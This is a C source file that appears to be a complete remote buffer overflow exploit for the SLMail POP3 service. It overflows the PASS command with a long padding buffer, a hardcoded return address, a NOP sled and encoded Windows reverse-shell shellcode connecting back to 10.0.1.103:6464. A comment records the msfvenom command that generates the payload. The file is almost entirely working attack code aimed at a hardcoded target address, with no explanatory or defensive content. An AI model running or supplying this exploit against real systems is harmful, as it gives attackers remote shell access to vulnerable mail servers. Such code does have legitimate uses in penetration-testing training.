#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
 
//define retadd \x9f\x45\x3a\x77 /*winXP server sp3 0x773a459f
//define redadd \x8f\x35\x4a\x5f /*winXP SP3 0x5f4a358f
#define retadd "\x8f\x35\x4a\x5f" 
#define port 110

// msfvenom -p windows/shell_reverse_tcp lhost=10.0.1.103 lport=6464 -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c

char shellcode[] =
"\xbb\xb8\xa3\x61\xd5\xda\xc4\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x31\x5a\x12\x83\xea\xfc\x03\xe2\xad\x83\x20\xee\x5a\xc1"
"\xcb\x0e\x9b\xa6\x42\xeb\xaa\xe6\x31\x78\x9c\xd6\x32\x2c\x11"
"\x9c\x17\xc4\xa2\xd0\xbf\xeb\x03\x5e\xe6\xc2\x94\xf3\xda\x45"
"\x17\x0e\x0f\xa5\x26\xc1\x42\xa4\x6f\x3c\xae\xf4\x38\x4a\x1d"
"\xe8\x4d\x06\x9e\x83\x1e\x86\xa6\x70\xd6\xa9\x87\x27\x6c\xf0"
"\x07\xc6\xa1\x88\x01\xd0\xa6\xb5\xd8\x6b\x1c\x41\xdb\xbd\x6c"
"\xaa\x70\x80\x40\x59\x88\xc5\x67\x82\xff\x3f\x94\x3f\xf8\x84"
"\xe6\x9b\x8d\x1e\x40\x6f\x35\xfa\x70\xbc\xa0\x89\x7f\x09\xa6"
"\xd5\x63\x8c\x6b\x6e\x9f\x05\x8a\xa0\x29\x5d\xa9\x64\x71\x05"
"\xd0\x3d\xdf\xe8\xed\x5d\x80\x55\x48\x16\x2d\x81\xe1\x75\x3a"
"\x66\xc8\x85\xba\xe0\x5b\xf6\x88\xaf\xf7\x90\xa0\x38\xde\x67"
"\xc6\x12\xa6\xf7\x39\x9d\xd7\xde\xfd\xc9\x87\x48\xd7\x71\x4c"
"\x88\xd8\xa7\xc3\xd8\x76\x18\xa4\x88\x36\xc8\x4c\xc2\xb8\x37"
"\x6c\xed\x12\x50\x07\x14\xf5\x55\xd8\x17\x62\x02\xda\x17\x75"
"\x92\x53\xf1\xef\x02\x32\xaa\x87\xbb\x1f\x20\x39\x43\x8a\x4d"
"\x79\xcf\x39\xb2\x34\x38\x37\xa0\xa1\xc8\x02\x9a\x64\xd6\xb8"
"\xb2\xeb\x45\x27\x42\x65\x76\xf0\x15\x22\x48\x09\xf3\xde\xf3"
"\xa3\xe1\x22\x65\x8b\xa1\xf8\x56\x12\x28\x8c\xe3\x30\x3a\x48"
"\xeb\x7c\x6e\x04\xba\x2a\xd8\xe2\x14\x9d\xb2\xbc\xcb\x77\x52"
"\x38\x20\x48\x24\x45\x6d\x3e\xc8\xf4\xd8\x07\xf7\x39\x8d\x8f"
"\x80\x27\x2d\x6f\x5b\xec\x5d\x3a\xc1\x45\xf6\xe3\x90\xd7\x9b"
"\x13\x4f\x1b\xa2\x97\x65\xe4\x51\x87\x0c\xe1\x1e\x0f\xfd\x9b"
"\x0f\xfa\x01\x0f\x2f\x2f";
 

struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2960);
    memset(buffer, 0x00, 2960);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
    memset(off, 0x41,2606);
    char *nop = malloc(25);
    memset(nop, 0x00, 25);
    memset(nop, 0x90, 25);

    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.0.1.119");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
